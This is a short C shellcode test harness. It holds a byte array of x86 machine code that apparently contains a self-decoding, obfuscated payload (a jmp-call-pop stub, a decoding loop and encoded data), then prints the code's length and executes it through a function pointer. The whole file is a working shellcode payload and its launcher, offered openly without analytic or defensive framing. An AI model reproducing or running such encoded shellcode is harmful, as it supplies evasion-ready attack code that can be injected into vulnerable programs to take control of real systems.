#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x4d\x66\x8b\x43\x0a\x66\xf7\x26\x66\xf7\x73\x08\x66\x89\xd0\xc3\x5b\x8d\x7b\x0c\x89\xfe\x31\xc9\xf7\xe1\xb1\x15\xe8\xe0\xff\xff\xff\x66\x51\xb1\x08\x01\xcb\x4b\x99\x8a\x13\x66\x39\xd0\xf8\x78\x04\x66\x29\xd0\xf9\xd1\xdd\xfe\xc9\x75\xec\xc1\xed\x18\x87\xea\x88\x17\x47\x8d\x76\x02\x66\x59\x66\x49\x75\xd0\xeb\x11\xe8\xbd\xff\xff\xff\x01\x02\x04\x09\x11\x23\x45\x8a\x9f\x02\x31\x00\x18\x05\x78\x05\xf3\x0b\xa5\x06\xd6\x02\xfa\x04\xad\x08\x79\x08\x26\x08\xfa\x04\xfa\x04\x79\x08\x79\x08\x84\x05\x01\x06\x3d\x04\x78\x08\xfe\x05\x23\x04\x58\x07\xed\x01";
    

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
